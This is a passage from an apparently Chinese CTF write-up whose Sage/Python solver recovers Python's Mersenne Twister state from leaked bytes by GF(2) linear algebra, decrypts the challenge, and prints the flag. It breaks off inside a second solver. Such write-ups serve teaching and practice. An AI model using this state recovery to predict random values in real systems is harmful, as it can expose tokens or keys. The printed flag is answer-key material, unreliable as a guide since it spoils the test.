class="number">81</span>, <span class="number">176</span>, <span class="number">22</span>, <span class="number">92</span>, <span class="number">139</span>, <span class="number">188</span>, <span class="number">48</span>, <span class="number">183</span>, <span class="number">229</span>, <span class="number">139</span>, <span class="number">205</span>, <span class="number">174</span>, <span class="number">131</span>, <span class="number">189</span>, <span class="number">241</span>, <span class="number">21</span>, <span class="number">146</span>, <span class="number">204</span>, <span class="number">58</span>, <span class="number">249</span>, <span class="number">167</span>, <span class="number">217</span>, <span class="number">174</span>, <span class="number">43</span>, <span class="number">41</span>, <span class="number">56</span>, <span class="number">181</span>, <span class="number">212</span>, <span class="number">42</span>, <span class="number">188</span>, <span class="number">6</span>, <span class="number">117</span>, <span class="number">93</span>, <span class="number">178</span>, <span class="number">160</span>, <span class="number">129</span>, <span class="number">15</span>, <span class="number">76</span>, <span class="number">150</span>, <span class="number">207</span>, <span class="number">245</span>, <span class="number">227</span>, <span class="number">247</span>, <span class="number">130</span>, <span class="number">171</span>, <span class="number">114</span>, <span class="number">204</span>, <span class="number">101</span>, <span class="number">176</span>, <span class="number">55</span>, <span class="number">43</span>, <span class="number">138</span>, <span class="number">149</span>, <span class="number">90</span>, <span class="number">124</span>, <span class="number">45</span>, <span class="number">96</span>, <span class="number">181</span>, <span class="number">221</span>, <span class="number">16</span>, <span class="number">121</span>, <span class="number">210</span>, <span class="number">51</span>, <span class="number">210</span>, <span class="number">164</span>, <span class="number">68</span>, <span class="number">64</span>, <span class="number">154</span>, <span class="number">167</span>, <span class="number">91</span>, <span class="number">69</span>, <span class="number">35</span>, <span class="number">153</span>, <span class="number">212</span>, <span class="number">10</span>, <span class="number">125</span>, <span class="number">235</span>, <span class="number">203</span>, <span class="number">166</span>, <span class="number">145</span>, <span class="number">9</span>, <span class="number">174</span>, <span class="number">86</span>, <span class="number">65</span>, <span class="number">70</span>, <span class="number">112</span>, <span class="number">194</span>, <span class="number">140</span>, <span class="number">92</span>, <span class="number">170</span>, <span class="number">49</span>, <span class="number">191</span>, <span class="number">157</span>, <span class="number">218</span>, <span class="number">199</span>, <span class="number">152</span>, <span class="number">151</span>, <span class="number">247</span>, <span class="number">208</span>, <span class="number">182</span>, <span class="number">209</span>, <span class="number">34</span>, <span class="number">245</span>, <span class="number">5</span>, <span class="number">173</span>, <span class="number">105</span>, <span class="number">175</span>, <span class="number">159</span>, <span class="number">71</span>, <span class="number">251</span>, <span class="number">198</span>, <span class="number">246</span>, <span class="number">214</span>, <span class="number">99</span>, <span class="number">58</span>, <span class="number">70</span>, <span class="number">154</span>, <span class="number">52</span>, <span class="number">39</span>, <span class="number">88</span>, <span class="number">149</span>, <span class="number">179</span>, <span class="number">202</span>, <span class="number">86</span>, <span class="number">240</span>, <span class="number">108</span>, <span class="number">200</span>, <span class="number">83</span>, <span class="number">250</span>, <span class="number">62</span>, <span class="number">213</span>, <span class="number">113</span>, <span class="number">138</span>, <span class="number">73</span>, <span class="number">106</span>, <span class="number">141</span>, <span class="number">192</span>, <span class="number">204</span>, <span class="number">90</span>, <span class="number">251</span>, <span class="number">208</span>, <span class="number">28</span>, <span class="number">124</span>, <span class="number">30</span>, <span class="number">134</span>, <span class="number">119</span>, <span class="number">144</span>, <span class="number">68</span>, <span class="number">23</span>, <span class="number">204</span>, <span class="number">181</span>, <span class="number">186</span>, <span class="number">76</span>, <span class="number">156</span>, <span class="number">71</span>, <span class="number">8</span>, <span class="number">104</span>, <span class="number">186</span>, <span class="number">87</span>, <span class="number">221</span>, <span class="number">134</span>, <span class="number">122</span>, <span class="number">72</span>, <span class="number">244</span>, <span class="number">203</span>, <span class="number">121</span>, <span class="number">181</span>, <span class="number">65</span>, <span class="number">90</span>, <span class="number">185</span>, <span class="number">131</span>, <span class="number">230</span>, <span class="number">133</span>, <span class="number">54</span>, <span class="number">158</span>, <span class="number">186</span>, <span class="number">168</span>, <span class="number">201</span>, <span class="number">178</span>, <span class="number">155</span>, <span class="number">172</span>, <span class="number">164</span>, <span class="number">22</span>, <span class="number">130</span>, <span class="number">111</span>, <span class="number">90</span>, <span class="number">209</span>, <span class="number">2</span>, <span class="number">167</span>, <span class="number">23</span>, <span class="number">176</span>, <span class="number">63</span>, <span class="number">139</span>, <span class="number">89</span>, <span class="number">63</span>, <span class="number">15</span>, <span class="number">238</span>, <span class="number">110</span>, <span class="number">204</span>, <span class="number">85</span>, <span class="number">36</span>, <span class="number">127</span>, <span class="number">68</span>, <span class="number">240</span>, <span class="number">177</span>, <span class="number">31</span>, <span class="number">2</span>, <span class="number">81</span>, <span class="number">147</span>, <span class="number">205</span>, <span class="number">192</span>, <span class="number">214</span>, <span class="number">173</span>, <span class="number">103</span>, <span class="number">130</span>, <span class="number">10</span>, <span class="number">100</span>, <span class="number">232</span>, <span class="number">125</span>, <span class="number">216</span>, <span class="number">163</span>, <span class="number">209</span>, <span class="number">171</span>, <span class="number">168</span>, <span class="number">243</span>, <span class="number">145</span>, <span class="number">6</span>, <span class="number">170</span>, <span class="number">41</span>, <span class="number">142</span>, <span class="number">250</span>, <span class="number">145</span>, <span class="number">57</span>, <span class="number">139</span>, <span class="number">224</span>, <span class="number">221</span>, <span class="number">189</span>, <span class="number">48</span>, <span class="number">141</span>, <span class="number">232</span>, <span class="number">146</span>, <span class="number">92</span>, <span class="number">216</span>, <span class="number">154</span>, <span class="number">126</span>, <span class="number">223</span>, <span class="number">8</span>, <span class="number">90</span>, <span class="number">82</span>, <span class="number">138</span>, <span class="number">221</span>, <span class="number">240</span>, <span class="number">223</span>, <span class="number">87</span>, <span class="number">209</span>, <span class="number">165</span>, <span class="number">17</span>, <span class="number">52</span>, <span class="number">154</span>, <span class="number">91</span>, <span class="number">12</span>, <span class="number">121</span>, <span class="number">212</span>, <span class="number">238</span>, <span class="number">46</span>, <span class="number">215</span>, <span class="number">217</span>, <span class="number">147</span>, <span class="number">136</span>, <span class="number">139</span>, <span class="number">251</span>, <span class="number">91</span>, <span class="number">39</span>, <span class="number">188</span>, <span class="number">244</span>, <span class="number">251</span>, <span class="number">52</span>, <span class="number">110</span>, <span class="number">22</span>, <span class="number">126</span>, <span class="number">200</span>, <span class="number">231</span>, <span class="number">153</span>, <span class="number">103</span>, <span class="number">203</span>, <span class="number">120</span>, <span class="number">219</span>, <span class="number">118</span>, <span class="number">172</span>, <span class="number">53</span>, <span class="number">141</span>, <span class="number">203</span>, <span class="number">75</span>, <span class="number">163</span>, <span class="number">150</span>, <span class="number">194</span>, <span class="number">27</span>, <span class="number">208</span>, <span class="number">9</span>, <span class="number">186</span>, <span class="number">6</span>, <span class="number">85</span>, <span class="number">46</span>, <span class="number">243</span>, <span class="number">135</span>, <span class="number">66</span>, <span class="number">40</span>, <span class="number">79</span>, <span class="number">206</span>, <span class="number">250</span>, <span class="number">20</span>, <span class="number">85</span>, <span class="number">123</span>, <span class="number">35</span>, <span class="number">164</span>, <span class="number">44</span>, <span class="number">85</span>, <span class="number">104</span>, <span class="number">66</span>, <span class="number">51</span>, <span class="number">177</span>, <span class="number">125</span>, <span class="number">189</span>, <span class="number">165</span>, <span class="number">226</span>, <span class="number">13</span>, <span class="number">75</span>, <span class="number">78</span>, <span class="number">225</span>, <span class="number">252</span>, <span class="number">226</span>, <span class="number">138</span>, <span class="number">81</span>, <span class="number">171</span>, <span class="number">172</span>, <span class="number">175</span>, <span class="number">122</span>, <span class="number">145</span>, <span class="number">68</span>, <span class="number">254</span>, <span class="number">37</span>, <span class="number">153</span>, <span class="number">39</span>, <span class="number">113</span>, <span class="number">237</span>, <span class="number">232</span>, <span class="number">220</span>, <span class="number">80</span>, <span class="number">193</span>, <span class="number">181</span>, <span class="number">21</span>, <span class="number">197</span>, <span class="number">186</span>, <span class="number">56</span>, <span class="number">202</span>, <span class="number">239</span>, <span class="number">213</span>, <span class="number">135</span>, <span class="number">41</span>, <span class="number">6</span>, <span class="number">85</span>, <span class="number">54</span>, <span class="number">135</span>, <span class="number">214</span>, <span class="number">95</span>, <span class="number">102</span>, <span class="number">23</span>, <span class="number">192</span>, <span class="number">153</span>, <span class="number">235</span>, <span class="number">110</span>, <span class="number">26</span>, <span class="number">14</span>, <span class="number">84</span>, <span class="number">220</span>, <span class="number">142</span>, <span class="number">236</span>, <span class="number">192</span>, <span class="number">8</span>, <span class="number">117</span>, <span class="number">205</span>, <span class="number">249</span>, <span class="number">92</span>, <span class="number">148</span>, <span class="number">149</span>, <span class="number">77</span>, <span class="number">235</span>, <span class="number">205</span>, <span class="number">232</span>, <span class="number">21</span>, <span class="number">48</span>, <span class="number">14</span>, <span class="number">84</span>, <span class="number">187</span>, <span class="number">124</span>, <span class="number">218</span>, <span class="number">166</span>, <span class="number">155</span>, <span class="number">183</span>, <span class="number">62</span>, <span class="number">10</span>, <span class="number">123</span>, <span class="number">53</span>, <span class="number">63</span>, <span class="number">79</span>, <span class="number">101</span>, <span class="number">193</span>, <span class="number">3</span>, <span class="number">61</span>, <span class="number">29</span>, <span class="number">39</span>, <span class="number">99</span>, <span class="number">22</span>, <span class="number">197</span>, <span class="number">75</span>, <span class="number">10</span>, <span class="number">165</span>, <span class="number">44</span>, <span class="number">215</span>, <span class="number">210</span>, <span class="number">181</span>, <span class="number">74</span>, <span class="number">235</span>, <span class="number">200</span>, <span class="number">247</span>, <span class="number">158</span>, <span class="number">187</span>, <span class="number">200</span>, <span class="number">102</span>, <span class="number">22</span>, <span class="number">150</span>, <span class="number">73</span>, <span class="number">42</span>, <span class="number">131</span>, <span class="number">28</span>, <span class="number">17</span>, <span class="number">180</span>, <span class="number">133</span>, <span class="number">205</span>, <span class="number">23</span>, <span class="number">228</span>, <span class="number">226</span>, <span class="number">219</span>, <span class="number">175</span>, <span class="number">207</span>, <span class="number">81</span>, <span class="number">53</span>, <span class="number">141</span>, <span class="number">114</span>, <span class="number">140</span>, <span class="number">59</span>, <span class="number">218</span>, <span class="number">169</span>, <span class="number">7</span>, <span class="number">219</span>, <span class="number">139</span>, <span class="number">75</span>, <span class="number">210</span>, <span class="number">97</span>, <span class="number">236</span>, <span class="number">157</span>, <span class="number">21</span>, <span class="number">109</span>, <span class="number">195</span>, <span class="number">128</span>, <span class="number">54</span>, <span class="number">5</span>, <span class="number">55</span>, <span class="number">217</span>, <span class="number">127</span>, <span class="number">49</span>, <span class="number">62</span>, <span class="number">59</span>, <span class="number">101</span>, <span class="number">95</span>, <span class="number">86</span>, <span class="number">255</span>, <span class="number">22</span>, <span class="number">186</span>, <span class="number">94</span>, <span class="number">151</span>, <span class="number">114</span>, <span class="number">93</span>, <span class="number">19</span>, <span class="number">198</span>, <span class="number">159</span>, <span class="number">174</span>, <span class="number">142</span>, <span class="number">132</span>, <span class="number">195</span>, <span class="number">157</span>, <span class="number">206</span>, <span class="number">161</span>, <span class="number">107</span>, <span class="number">255</span>, <span class="number">106</span>, <span class="number">196</span>, <span class="number">250</span>, <span class="number">191</span>, <span class="number">86</span>, <span class="number">221</span>, <span class="number">196</span>, <span class="number">36</span>, <span class="number">29</span>, <span class="number">37</span>, <span class="number">50</span>, <span class="number">224</span>, <span class="number">42</span>, <span class="number">20</span>, <span class="number">89</span>, <span class="number">212</span>, <span class="number">252</span>, <span class="number">191</span>, <span class="number">157</span>, <span class="number">237</span>, <span class="number">10</span>, <span class="number">157</span>, <span class="number">80</span>, <span class="number">42</span>, <span class="number">234</span>, <span class="number">180</span>, <span class="number">1</span>, <span class="number">183</span>, <span class="number">186</span>, <span class="number">239</span>, <span class="number">129</span>, <span class="number">14</span>, <span class="number">125</span>, <span class="number">114</span>, <span class="number">66</span>, <span class="number">203</span>, <span class="number">120</span>, <span class="number">114</span>, <span class="number">37</span>, <span class="number">214</span>, <span class="number">37</span>, <span class="number">73</span>, <span class="number">153</span>, <span class="number">182</span>, <span class="number">165</span>, <span class="number">87</span>, <span class="number">177</span>, <span class="number">75</span>, <span class="number">220</span>, <span class="number">210</span>, <span class="number">105</span>, <span class="number">154</span>, <span class="number">149</span>, <span class="number">114</span>, <span class="number">13</span>, <span class="number">202</span>, <span class="number">128</span>, <span class="number">55</span>, <span class="number">128</span>, <span class="number">96</span>, <span class="number">158</span>, <span class="number">150</span>, <span class="number">57</span>, <span class="number">86</span>, <span class="number">106</span>, <span class="number">127</span>, <span class="number">160</span>, <span class="number">57</span>, <span class="number">80</span>, <span class="number">255</span>, <span class="number">107</span>, <span class="number">241</span>, <span class="number">95</span>, <span class="number">121</span>, <span class="number">14</span>, <span class="number">110</span>, <span class="number">160</span>, <span class="number">119</span>, <span class="number">211</span>, <span class="number">150</span>, <span class="number">156</span>, <span class="number">185</span>, <span class="number">158</span>, <span class="number">221</span>, <span class="number">110</span>, <span class="number">76</span>, <span class="number">255</span>, <span class="number">119</span>, <span class="number">15</span>, <span class="number">245</span>, <span class="number">1</span>, <span class="number">238</span>, <span class="number">139</span>, <span class="number">100</span>, <span class="number">250</span>, <span class="number">220</span>, <span class="number">147</span>, <span class="number">193</span>, <span class="number">51</span>, <span class="number">144</span>, <span class="number">123</span>, <span class="number">139</span>, <span class="number">13</span>, <span class="number">26</span>, <span class="number">158</span>, <span class="number">95</span>, <span class="number">148</span>, <span class="number">251</span>, <span class="number">82</span>, <span class="number">227</span>, <span class="number">119</span>, <span class="number">92</span>, <span class="number">132</span>, <span class="number">219</span>, <span class="number">248</span>, <span class="number">239</span>, <span class="number">217</span>, <span class="number">101</span>, <span class="number">88</span>, <span class="number">121</span>, <span class="number">10</span>, <span class="number">148</span>, <span class="number">203</span>, <span class="number">156</span>, <span class="number">156</span>]</span><br><span class="line">c = [test.index(k) <span class="keyword">for</span> k <span class="keyword">in</span> cc]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2, recover MT and get random bytes of (f_inf, f_len)</span></span><br><span class="line">RNG = Random()</span><br><span class="line">length = <span class="number">19968</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">construct_a_row</span>(<span class="params">RNG</span>):</span><br><span class="line">    <span class="comment"># 这里是关键, 一定要跟你已知数据的生成方式一致</span></span><br><span class="line">    row = []</span><br><span class="line">    RNG.getrandbits(<span class="number">171</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2496</span>):</span><br><span class="line">        row+=<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, (<span class="built_in">bin</span>(RNG.getrandbits(<span class="number">8</span>))[<span class="number">2</span>:].zfill(<span class="number">8</span>))))</span><br><span class="line">    <span class="keyword">return</span> row</span><br><span class="line"></span><br><span class="line">L = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> trange(length):</span><br><span class="line">    state = [<span class="number">0</span>]*<span class="number">624</span></span><br><span class="line">    temp = <span class="string">&quot;0&quot;</span>*i + <span class="string">&quot;1&quot;</span>*<span class="number">1</span> + <span class="string">&quot;0&quot;</span>*(length-<span class="number">1</span>-i)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>):</span><br><span class="line">        state[j] = <span class="built_in">int</span>(temp[<span class="number">32</span>*j:<span class="number">32</span>*j+<span class="number">32</span>],<span class="number">2</span>)</span><br><span class="line">    RNG.setstate((<span class="number">3</span>,<span class="built_in">tuple</span>(state+[<span class="number">624</span>]),<span class="literal">None</span>))</span><br><span class="line">    L.append(construct_a_row(RNG))</span><br><span class="line">L = Matrix(GF(<span class="number">2</span>),L)</span><br><span class="line"></span><br><span class="line">known = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(c):</span><br><span class="line">    known+=<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, (<span class="built_in">bin</span>(i)[<span class="number">2</span>:].zfill(<span class="number">8</span>))))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;solve_left&quot;</span>)</span><br><span class="line">s = L.solve_left(vector(GF(<span class="number">2</span>),known))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ok&quot;</span>)</span><br><span class="line">init = <span class="string">&quot;&quot;</span>.join(<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">str</span>,s)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;init&quot;</span>)</span><br><span class="line">state = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>):</span><br><span class="line">    state.append(<span class="built_in">int</span>(init[<span class="number">32</span>*i:<span class="number">32</span>*i+<span class="number">32</span>],<span class="number">2</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;state&quot;</span>)</span><br><span class="line"></span><br><span class="line">prng = Random()</span><br><span class="line">prng.setstate(<span class="built_in">tuple</span>([<span class="number">3</span>, <span class="built_in">tuple</span>(state+[<span class="number">624</span>]), <span class="literal">None</span>]))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(enc^^prng.getrandbits(<span class="number">172</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">b&#x27;___0h_51mple_r@nd0m___&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>又因为enc.bit_length()是172，所以明文的长度应该也是172附近，都试试就行了。</p>
<p>也可以用gf2bv这个库打(不过要加一个[mt[0] ^ 0x80000000])，加了之后需要的数据个数会少一点。此时我们用ans.append(255-r[i])还原位置。</p>
<p>refer:[XYCTF2025 wp&amp;复现 | Lst4r’s Blog](<a href="https://lst4r-max.github.io/2025/04/08/XYCTF2025">https://lst4r-max.github.io/2025/04/08/XYCTF2025</a> wp&amp;复现&#x2F;)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gf2bv <span class="keyword">import</span> LinearSystem</span><br><span class="line"><span class="keyword">from</span> gf2bv.crypto.mt <span class="keyword">import</span> MT19937</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">enc = <span class="number">5042764371819053176884777909105310461303359296255297</span></span><br><span class="line">r = [<span class="number">224</span>, <span class="number">55</span>, <span class="number">218</span>, <span class="number">253</span>, <span class="number">150</span>, <span class="number">84</span>, <span class="number">208</span>, <span class="number">134</span>, <span class="number">18</span>, <span class="number">177</span>, <span class="number">244</span>, <span class="number">54</span>, <span class="number">122</span>, <span class="number">193</span>, <span class="number">249</span>, <span class="number">5</span>, <span class="number">121</span>, <span class="number">80</span>, <span class="number">230</span>, <span class="number">21</span>, <span class="number">236</span>, <span class="number">33</span>, <span class="number">226</span>, <span class="number">3</span>, <span class="number">120</span>, <span class="number">141</span>, <span class="number">212</span>, <span class="number">33</span>, <span class="number">69</span>, <span class="number">195</span>, <span class="number">78</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">62</span>, <span class="number">64</span>, <span class="number">197</span>, <span class="number">10</span>, <span class="number">224</span>, <span class="number">64</span>, <span class="number">191</span>, <span class="number">17</span>, <span class="number">112</span>, <span class="number">196</span>, <span class="number">143</span>, <span class="number">209</span>, <span class="number">92</span>, <span class="number">10</span>, <span class="number">198</span>, <span class="number">174</span>, <span class="number">181</span>, <span class="number">96</span>, <span class="number">118</span>, <span class="number">175</span>, <span class="number">145</span>, <span class="number">111</span>, <span class="number">41</span>, <span class="number">113</span>, <span class="number">206</span>, <span class="number">137</span>, <span class="number">37</span>, <span class="number">56</span>, <span class="number">227</span>, <span class="number">252</span>, <span class="number">84</span>, <span class="number">18</span>, <span class="number">145</span>, <span class="number">81</span>, <span class="number">124</span>, <span class="number">202</span>, <span class="number">14</span>, <span class="number">255</span>, <span class="number">144</span>, <span class="number">200</span>, <span class="number">13</span>, <span class="number">230</span>, <span class="number">218</span>, <span class="number">208</span>, <span class="number">210</span>, <span class="number">222</span>, <span class="number">101</span>, <span class="number">211</span>, <span class="number">114</span>, <span class="number">222</span>, <span class="number">12</span>, <span class="number">190</span>, <span class="number">226</span>, <span class="number">62</span>, <span class="number">118</span>, <span class="number">87</span>, <span class="number">152</span>, <span class="number">118</span>, <span class="number">245</span>, <span class="number">196</span>, <span class="number">4</span>, <span class="number">92</span>, <span class="number">251</span>, <span class="number">238</span>, <span class="number">142</span>, <span class="number">114</span>, <span class="number">13</span>, <span class="number">113</span>, <span class="number">247</span>, <span class="number">171</span>, <span class="number">8</span>, <span class="number">138</span>, <span class="number">20</span>, <span class="number">169</span>, <span class="number">192</span>, <span class="number">221</span>, <span class="number">223</span>, <span class="number">60</span>, <span class="number">56</span>, <span class="number">188</span>, <span class="number">70</span>, <span class="number">184</span>, <span class="number">202</span>, <span class="number">195</span>, <span class="number">246</span>, <span class="number">71</span>, <span class="number">235</span>, <span class="number">152</span>, <span class="number">255</span>, <span class="number">73</span>, <span class="number">128</span>, <span class="number">140</span>, <span class="number">159</span>, <span class="number">119</span>, <span class="number">79</span>, <span class="number">1</span>, <span class="number">223</span>, <span class="number">239</span>, <span class="number">242</span>, <span class="number">60</span>, <span class="number">228</span>, <span class="number">205</span>, <span class="number">90</span>, <span class="number">210</span>, <span class="number">5</span>, <span class="number">165</span>, <span class="number">35</span>, <span class="number">176</span>, <span class="number">75</span>, <span class="number">21</span>, <span class="number">182</span>, <span class="number">220</span>, <span class="number">212</span>, <span class="number">240</span>, <span class="number">212</span>, <span class="number">77</span>, <span class="number">124</span>, <span class="number">52</span>, <span class="number">140</span>, <span class="number">85</span>, <span class="number">200</span>, <span class="number">207</span>, <span class="number">31</span>, <span class="number">177</span>, <span class="number">82</span>, <span class="number">76</span>, <span class="number">152</span>, <span class="number">128</span>, <span class="number">124</span>, <span class="number">205</span>, <span class="number">216</span>, <span class="number">252</span>, <span class="number">34</span>, <span class="number">27</span>, <span class="number">198</span>, <span class="number">186</span>, <span class="number">61</span>, <span class="number">161</span>, <span class="number">192</span>, <span class="number">158</span>, <span class="number">226</span>, <span class="number">40</span>, <span class="number">127</span>, <span class="number">69</span>, <span class="number">162</span>, <span class="number">24</span>, <span class="number">46</span>, <span class="number">208</span>, <span class="number">183</span>, <span class="number">99</span>, <span class="number">165</span>, <span class="number">1</span>, <span class="number">221</span>, <span class="number">184</span>, <span class="number">40</span>, <span class="number">147</span>, <span class="number">136</span>, <span class="number">236</span>, <span class="number">245</span>, <span class="number">228</span>, <span class="number">197</span>, <span class="number">86</span>, <span class="number">15</span>, <span class="number">201</span>, <span class="number">95</span>, <span class="number">115</span>, <span class="number">18</span>, <span class="number">131</span>, <span class="number">79</span>, <span class="number">86</span>, <span class="number">12</span>, <span class="number">122</span>, <span class="number">63</span>, <span class="number">200</span>, <span class="number">192</span>, <span class="number">244</span>, <span class="number">205</span>, <span class="number">229</span>, <span class="number">36</span>, <span class="number">86</span>, <span class="number">217</span>, <span class="number">249</span>, <span class="number">170</span>, <span class="number">5</span>, <span class="number">134</span>, <span class="number">99</span>, <span class="number">33</span>, <span class="number">214</span>, <span class="number">10</span>, <span class="number">120</span>, <span class="number">105</span>, <span class="number">233</span>, <span class="number">115</span>, <span class="number">230</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">84</span>, <span class="number">39</span>, <span class="number">167</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="number">77</span>, <span class="number">236</span>, <span class="number">104</span>, <span class="number">225</span>, <span class="number">196</span>, <span class="number">181</span>, <span class="number">105</span>, <span class="number">180</span>, <span class="number">159</span>, <span class="number">24</span>, <span class="number">4</span>, <span class="number">147</span>, <span class="number">131</span>, <span class="number">143</span>, <span class="number">64</span>, <span class="number">201</span>, <span class="number">212</span>, <span class="number">175</span>, <span class="number">203</span>, <span class="number">200</span>, <span class="number">19</span>, <span class="number">99</span>, <span class="number">24</span>, <span class="number">112</span>, <span class="number">180</span>, <span class="number">75</span>, <span class="number">222</span>, <span class="number">204</span>, <span class="number">204</span>, <span class="number">13</span>, <span class="number">210</span>, <span class="number">165</span>, <span class="number">135</span>, <span class="number">175</span>, <span class="number">132</span>, <span class="number">205</span>, <span class="number">247</span>, <span class="number">28</span>, <span class="number">178</span>, <span class="number">76</span>, <span class="number">240</span>, <span class="number">196</span>, <span class="number">240</span>, <span class="number">121</span>, <span class="number">132</span>, <span class="number">21</span>, <span class="number">8</span>, <span class="number">45</span>, <span class="number">203</span>, <span class="number">143</span>, <span class="number">206</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">51</span>, <span class="number">47</span>, <span class="number">87</span>, <span class="number">88</span>, <span class="number">35</span>, <span class="number">63</span>, <span class="number">168</span>, <span class="number">251</span>, <span class="number">11</span>, <span class="number">254</span>, <span class="number">11</span>, <span class="number">46</span>, <span class="number">72</span>, <span class="number">210</span>, <span class="number">230</span>, <span class="number">184</span>, <span class="number">114</span>, <span class="number">88</span>, <span class="number">194</span>, <span class="number">99</span>, <span class="number">229</span>, <span class="number">144</span>, <span class="number">1</span>, <span class="number">226</span>, <span class="number">44</span>, <span class="number">133</span>, <span class="number">10</span>, <span class="number">42</span>, <span class="number">234</span>, <span class="number">112</span>, <span class="number">100</span>, <span class="number">248</span>, <span class="number">247</span>, <span class="number">66</span>, <span class="number">221</span>, <span class="number">72</span>, <span class="number">229</span>, <span class="number">236</span>, <span class="number">4</span>, <span class="number">65</span>, <span class="number">203</span>, <span class="number">65</span>, <span class="number">61</span>, <span class="number">23</span>, <span class="number">181</span>, <span class="number">190</span>, <span class="number">87</span>, <span class="number">1</span>, <span class="number">76</span>, <span class="number">113</span>, <span class="number">48</span>, <span class="number">178</span>, <span class="number">42</span>, <span class="number">175</span>, <span class="number">49</span>, <span class="number">78</span>, <span class="number">159</span>, <span class="number">104</span>, <span class="number">229</span>, <span class="number">213</span>, <span class="number">223</span>, <span class="number">13</span>, <span class="number">249</span>, <span class="number">216</span>, <span class="number">60</span>, <span class="number">144</span>, <span class="number">203</span>, <span class="number">156</span>, <span class="number">23</span>, <span class="number">129</span>, <span class="number">148</span>, <span class="number">87</span>, <span class="number">37</span>, <span class="number">79</span>, <span class="number">227</span>, <span class="number">141</span>, <span class="number">202</span>, <span class="number">210</span>, <span class="number">245</span>, <span class="number">236</span>, <span class="number">121</span>, <span class="number">129</span>, <span class="number">78</span>, <span class="number">7</span>, <span class="number">121</span>, <span class="number">42</span>, <span class="number">82</span>, <span class="number">184</span>, <span class="number">222</span>, <span class="number">96</span>, <span class="number">100</span>, <span class="number">189</span>, <span class="number">62</span>, <span class="number">102</span>, <span class="number">176</span>, <span class="number">198</span>, <span class="number">1</span>, <span class="number">153</span>, <span class="number">242</span>, <span class="number">23</span>, <span class="number">191</span>, <span class="number">197</span>, <span class="number">176</span>, <span class="number">115</span>, <span class="number">206</span>, <span class="number">122</span>, <span class="number">50</span>, <span class="number">104</span>, <span class="number">70</span>, <span class="number">170</span>, <span class="number">29</span>, <span class="number">52</span>, <span class="number">189</span>, <span class="number">157</span>, <span class="number">99</span>, <span class="number">82</span>, <span class="number">187</span>, <span class="number">201</span>, <span class="number">78</span>, <span class="number">25</span>, <span class="number">75</span>, <span class="number">126</span>, <span class="number">118</span>, <span class="number">160</span>, <span class="number">250</span>, <span class="number">53</span>, <span class="number">112</span>, <span class="number">143</span>, <span class="number">161</span>, <span class="number">251</span>, <span class="number">221</span>, <span class="number">44</span>, <span class="number">255</span>, <span class="number">232</span>, <span class="number">115</span>, <span class="number">182</span>, <span class="number">77</span>, <span class="number">31</span>, <span class="number">217</span>, <span class="number">228</span>, <span class="number">97</span>, <span class="number">112</span>, <span class="number">236</span>, <span class="number">21</span>, <span class="number">160</span>, <span class="number">127</span>, <span class="number">9</span>, <span class="number">220</span>, <span class="number">22</span>, <span class="number">97</span>, <span class="number">159</span>, <span class="number">239</span>, <span class="number">25</span>, <span class="number">140</span>, <span class="number">206</span>, <span class="number">210</span>, <span class="number">148</span>, <span class="number">105</span>, <span class="number">184</span>, <span class="number">41</span>, <span class="number">56</span>, <span class="number">92</span>, <span class="number">141</span>, <span class="number">3</span>, <span class="number">200</span>, <span class="number">165</span>, <span class="number">14</span>, <span class="number">161</span>, <span class="number">219</span>, <span class="number">177</span>, <span class="number">40</span>, <span class="number">189</span>, <span class="number">75</span>, <span class="number">48</span>, <span class="number">146</span>, <span class="number">130</span>, <span class="number">151</span>, <span class="number">100</span>, <span class="number">144</span>, <span class="number">239</span>, <span class="number">22</span>, <span class="number">19</span>, <span class="number">246</span>, <span class="number">166</span>, <span class="number">231</span>, <span class="number">228</span>, <span class="number">68</span>, <span class="number">254</span>, <span class="number">16</span>, <span class="number">99</span>, <span class="number">95</span>, <span class="number">32</span>, <span class="number">177</span>, <span class="number">216</span>, <span class="number">170</span>, <span class="number">125</span>, <span class="number">211</span>, <span class="number">100</span>, <span class="number">142</span>, <span class="number">251</span>, <span class="number">16</span>, <span class="number">64</span>, <span class="number">83</span>, <span class="number">161</span>, <span class="number">184</span>, <span class="number">242</span>, <span class="number">248</span>, <span class="number">239</span>, <span class="number">141</span>, <span class="number">171</span>, <span class="number">135</span>, <span class="number">48</span>, <span class="number">20</span>, <span class="number">34</span>, <span class="number">250</span>, <span class="number">13</span>, <span class="number">70</span>, <span class="number">236</span>, <span class="number">172</span>, <span class="number">22</span>, <span class="number">241</span>, <span class="number">171</span>, <span class="number">25</span>, <span class="number">18</span>, <span class="number">204</span>, <span class="number">36</span>, <span class="number">248</span>, <span class="number">253</span>, <span class="number">203</span>, <span class="number">138</span>, <span class="number">10</span>, <span class="number">130</span>, <span class="number">249</span>, <span class="number">15</span>, <span class="number">157</span>, <span class="number">244</span>, <span class="number">154</span>, <span class="number">41</span>, <span class="number">4</span>, <span class="number">231</span>, <span class="number">64</span>, <span class="number">20</span>, <span class="number">212</span>, <span class="number">126</span>, 